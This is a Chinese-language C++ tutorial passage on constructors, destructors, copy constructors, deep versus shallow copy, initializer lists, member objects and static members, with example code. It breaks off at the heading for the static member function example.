<p>对象的初始化和清理工作是编译器强制要我们做的事情，因此如果<strong>我们不提供构造和析构，编译器会提供</strong></p>
<p><strong>编译器提供的构造函数和析构函数是空实现。</strong></p>
<ul>
<li>构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。</li>
<li>析构函数：主要作用在于对象<strong>销毁前</strong>系统自动调用，执行一些清理工作。</li>
</ul>
<p><strong>构造函数语法：</strong><code>类名()&#123;&#125;</code></p>
<ol>
<li>构造函数，没有返回值也不写void</li>
<li>函数名称与类名相同</li>
<li>构造函数可以有参数，因此可以发生重载</li>
<li>程序在调用对象时候会自动调用构造，无须手动调用,而且只会调用一次</li>
</ol>
<p><strong>析构函数语法：</strong> <code>~类名()&#123;&#125;</code></p>
<ol>
<li>析构函数，没有返回值也不写void</li>
<li>函数名称与类名相同,在名称前加上符号  ~</li>
<li>析构函数不可以有参数，因此不可以发生重载</li>
<li>程序在对象销毁前会自动调用析构，无须手动调用,而且只会调用一次</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person的构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//析构函数</span></span><br><span class="line">	~<span class="built_in">Person</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person的析构函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h4 id="4-2-2-构造函数的分类及调用"><a href="#4-2-2-构造函数的分类及调用" class="headerlink" title="4.2.2 构造函数的分类及调用"></a>4.2.2 构造函数的分类及调用</h4><p>两种分类方式：</p>
<p>​	按参数分为： 有参构造和无参构造</p>
<p>​	按类型分为： 普通构造和拷贝构造</p>
<p>三种调用方式：</p>
<p>​	括号法</p>
<p>​	显示法</p>
<p>​	隐式转换法</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1、构造函数分类</span></span><br><span class="line"><span class="comment">// 按照参数分类分为 有参和无参构造   无参又称为默认构造函数</span></span><br><span class="line"><span class="comment">// 按照类型分类分为 普通构造和拷贝构造</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//无参（默认）构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//有参构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a) &#123;</span><br><span class="line">		age = a;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//拷贝构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		age = p.age;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//析构函数</span></span><br><span class="line">	~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、构造函数的调用</span></span><br><span class="line"><span class="comment">//调用无参构造函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Person p; <span class="comment">//调用无参构造函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用有参的构造函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.1  括号法，常用</span></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="comment">//注意1：调用无参构造函数不能加括号，如果加了编译器认为这是一个函数声明</span></span><br><span class="line">	<span class="comment">//Person p2();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.2 显式法</span></span><br><span class="line">	Person p2 = <span class="built_in">Person</span>(<span class="number">10</span>); </span><br><span class="line">	Person p3 = <span class="built_in">Person</span>(p2);</span><br><span class="line">	<span class="comment">//Person(10)单独写就是匿名对象  当前行结束之后，马上析构</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.3 隐式转换法</span></span><br><span class="line">	Person p4 = <span class="number">10</span>; <span class="comment">// Person p4 = Person(10); </span></span><br><span class="line">	Person p5 = p4; <span class="comment">// Person p5 = Person(p4); </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//注意2：不能利用 拷贝构造函数 初始化匿名对象 编译器认为是对象声明</span></span><br><span class="line">	<span class="comment">//Person p5(p4);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="comment">//test02();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h4 id="4-2-3-拷贝构造函数调用时机"><a href="#4-2-3-拷贝构造函数调用时机" class="headerlink" title="4.2.3 拷贝构造函数调用时机"></a>4.2.3 拷贝构造函数调用时机</h4><p>C++中拷贝构造函数调用时机通常有三种情况</p>
<ul>
<li>使用一个已经创建完毕的对象来初始化一个新对象</li>
<li>值传递的方式给函数参数传值</li>
<li>以值方式返回局部对象</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		mAge = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> age) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		mAge = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		mAge = p.mAge;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//析构函数在释放内存之前调用</span></span><br><span class="line">	~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 使用一个已经创建完毕的对象来初始化一个新对象</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">man</span><span class="params">(<span class="number">100</span>)</span></span>; <span class="comment">//p对象已经创建完毕</span></span><br><span class="line">	<span class="function">Person <span class="title">newman</span><span class="params">(man)</span></span>; <span class="comment">//调用拷贝构造函数</span></span><br><span class="line">	Person newman2 = man; <span class="comment">//拷贝构造</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//Person newman3;</span></span><br><span class="line">	<span class="comment">//newman3 = man; //不是调用拷贝构造函数，赋值操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 值传递的方式给函数参数传值</span></span><br><span class="line"><span class="comment">//相当于Person p1 = p;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">doWork</span><span class="params">(Person p1)</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Person p; <span class="comment">//无参构造函数</span></span><br><span class="line">	<span class="built_in">doWork</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 以值方式返回局部对象</span></span><br><span class="line"><span class="function">Person <span class="title">doWork2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person p1;</span><br><span class="line">	cout &lt;&lt; (<span class="type">int</span> *)&amp;p1 &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test03</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person p = <span class="built_in">doWork2</span>();</span><br><span class="line">	cout &lt;&lt; (<span class="type">int</span> *)&amp;p &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line">	<span class="comment">//test02();</span></span><br><span class="line">	<span class="built_in">test03</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="4-2-4-构造函数调用规则"><a href="#4-2-4-构造函数调用规则" class="headerlink" title="4.2.4 构造函数调用规则"></a>4.2.4 构造函数调用规则</h4><p>默认情况下，c++编译器至少给一个类添加3个函数</p>
<p>1．默认构造函数(无参，函数体为空)</p>
<p>2．默认析构函数(无参，函数体为空)</p>
<p>3．默认拷贝构造函数，对属性进行值拷贝</p>
<p>构造函数调用规则如下：</p>
<ul>
<li><p>如果用户定义有参构造函数，c++不在提供默认无参构造，但是会提供默认拷贝构造</p>
</li>
<li><p>如果用户定义拷贝构造函数，c++不会再提供其他构造函数</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//无参（默认）构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//有参构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a) &#123;</span><br><span class="line">		age = a;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//拷贝构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		age = p.age;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//析构函数</span></span><br><span class="line">	~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">18</span>)</span></span>;</span><br><span class="line">	<span class="comment">//如果不写拷贝构造，编译器会自动添加拷贝构造，并且做浅拷贝操作</span></span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(p1)</span></span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p2的年龄为： &quot;</span> &lt;&lt; p2.age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//如果用户提供有参构造，编译器不会提供默认构造，会提供拷贝构造</span></span><br><span class="line">	Person p1; <span class="comment">//此时如果用户自己没有提供默认构造，会出错</span></span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">//用户提供的有参</span></span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(p2)</span></span>; <span class="comment">//此时如果用户没有提供拷贝构造，编译器会提供</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果用户提供拷贝构造，编译器不会提供其他构造函数</span></span><br><span class="line">	Person p4; <span class="comment">//此时如果用户自己没有提供默认构造，会出错</span></span><br><span class="line">	<span class="function">Person <span class="title">p5</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">//此时如果用户自己没有提供有参，会出错</span></span><br><span class="line">	<span class="function">Person <span class="title">p6</span><span class="params">(p5)</span></span>; <span class="comment">//用户自己提供拷贝构造</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h4 id="4-2-5-深拷贝与浅拷贝"><a href="#4-2-5-深拷贝与浅拷贝" class="headerlink" title="4.2.5 深拷贝与浅拷贝"></a>4.2.5 深拷贝与浅拷贝</h4><p>深浅拷贝是面试经典问题，也是常见的一个坑</p>
<p>浅拷贝：简单的赋值拷贝操作</p>
<p>深拷贝：在堆区重新申请空间，进行拷贝操作</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//无参（默认）构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//有参构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> age ,<span class="type">int</span> height) &#123;</span><br><span class="line">		</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		m_age = age;</span><br><span class="line">		m_height = <span class="keyword">new</span> <span class="built_in">int</span>(height);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//拷贝构造函数  </span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//如果不利用深拷贝在堆区创建新内存，会导致浅拷贝带来的重复释放堆区问题</span></span><br><span class="line">		m_age = p.m_age;</span><br><span class="line">		m_height = <span class="keyword">new</span> <span class="built_in">int</span>(*p.m_height);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//析构函数</span></span><br><span class="line">	~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span> (m_height != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_height;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> m_age;</span><br><span class="line">	<span class="type">int</span>* m_height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">18</span>, <span class="number">180</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(p1)</span></span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p1的年龄： &quot;</span> &lt;&lt; p1.m_age &lt;&lt; <span class="string">&quot; 身高： &quot;</span> &lt;&lt; *p1.m_height &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p2的年龄： &quot;</span> &lt;&lt; p2.m_age &lt;&lt; <span class="string">&quot; 身高： &quot;</span> &lt;&lt; *p2.m_height &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>总结：如果属性有在堆区开辟的，一定要自己提供拷贝构造函数，防止浅拷贝带来的问题</p>
</blockquote>
<h4 id="4-2-6-初始化列表"><a href="#4-2-6-初始化列表" class="headerlink" title="4.2.6 初始化列表"></a>4.2.6 初始化列表</h4><p><strong>作用：</strong></p>
<p>C++提供了初始化列表语法，用来初始化属性</p>
<p><strong>语法：</strong><code>构造函数()：属性1(值1),属性2（值2）... &#123;&#125;</code></p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment">////传统方式初始化</span></span><br><span class="line">	<span class="comment">//Person(int a, int b, int c) &#123;</span></span><br><span class="line">	<span class="comment">//	m_A = a;</span></span><br><span class="line">	<span class="comment">//	m_B = b;</span></span><br><span class="line">	<span class="comment">//	m_C = c;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//初始化列表方式初始化</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c) :<span class="built_in">m_A</span>(a), <span class="built_in">m_B</span>(b), <span class="built_in">m_C</span>(c) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">PrintPerson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; m_A &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;mB:&quot;</span> &lt;&lt; m_B &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;mC:&quot;</span> &lt;&lt; m_C &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line">	<span class="type">int</span> m_C;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span></span>;</span><br><span class="line">	p.<span class="built_in">PrintPerson</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="4-2-7-类对象作为类成员"><a href="#4-2-7-类对象作为类成员" class="headerlink" title="4.2.7 类对象作为类成员"></a>4.2.7 类对象作为类成员</h4><p>C++类中的成员可以是另一个类的对象，我们称该成员为 对象成员</p>
<p>例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span></span><br><span class="line">&#123;</span><br><span class="line">    A a；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>B类中有对象A作为成员，A为对象成员</p>
<p>那么当创建B对象时，A与B的构造和析构的顺序是谁先谁后？</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Phone</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Phone</span>(string name)</span><br><span class="line">	&#123;</span><br><span class="line">		m_PhoneName = name;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Phone构造&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	~<span class="built_in">Phone</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Phone析构&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	string m_PhoneName;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="comment">//初始化列表可以告诉编译器调用哪一个构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(string name, string pName) :<span class="built_in">m_Name</span>(name), <span class="built_in">m_Phone</span>(pName)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person构造&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	~<span class="built_in">Person</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person析构&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">playGame</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; m_Name &lt;&lt; <span class="string">&quot; 使用&quot;</span> &lt;&lt; m_Phone.m_PhoneName &lt;&lt; <span class="string">&quot; 牌手机! &quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	string m_Name;</span><br><span class="line">	Phone m_Phone;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//当类中成员是其他类对象时，我们称该成员为 对象成员</span></span><br><span class="line">	<span class="comment">//构造的顺序是 ：先调用对象成员的构造，再调用本类构造</span></span><br><span class="line">	<span class="comment">//析构顺序与构造相反</span></span><br><span class="line">	<span class="function">Person <span class="title">p</span><span class="params">(<span class="string">&quot;张三&quot;</span> , <span class="string">&quot;苹果X&quot;</span>)</span></span>;</span><br><span class="line">	p.<span class="built_in">playGame</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h4 id="4-2-8-静态成员"><a href="#4-2-8-静态成员" class="headerlink" title="4.2.8 静态成员"></a>4.2.8 静态成员</h4><p>静态成员就是在成员变量和成员函数前加上关键字static，称为静态成员</p>
<p>静态成员分为：</p>
<ul>
<li>静态成员变量<ul>
<li>所有对象共享同一份数据</li>
<li>在编译阶段分配内存</li>
<li>类内声明，类外初始化</li>
</ul>
</li>
<li>静态成员函数<ul>
<li>所有对象共享同一个函数</li>
<li>静态成员函数只能访问静态成员变量</li>
</ul>
</li>
</ul>
<p><strong>示例1 ：</strong>静态成员变量</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_A; <span class="comment">//静态成员变量</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//静态成员变量特点：</span></span><br><span class="line">	<span class="comment">//1 在编译阶段分配内存</span></span><br><span class="line">	<span class="comment">//2 类内声明，类外初始化</span></span><br><span class="line">	<span class="comment">//3 所有对象共享同一份数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_B; <span class="comment">//静态成员变量也是有访问权限的</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Person::m_A = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> Person::m_B = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//静态成员变量两种访问方式</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、通过对象</span></span><br><span class="line">	Person p1;</span><br><span class="line">	p1.m_A = <span class="number">100</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p1.m_A = &quot;</span> &lt;&lt; p1.m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	Person p2;</span><br><span class="line">	p2.m_A = <span class="number">200</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p1.m_A = &quot;</span> &lt;&lt; p1.m_A &lt;&lt; endl; <span class="comment">//共享同一份数据</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p2.m_A = &quot;</span> &lt;&lt; p2.m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、通过类名</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;m_A = &quot;</span> &lt;&lt; Person::m_A &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;m_B = &quot; &lt;&lt; Person::m_B &lt;&lt; endl; //私有权限访问不到</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>示例2：</strong>静态成员函数</p>
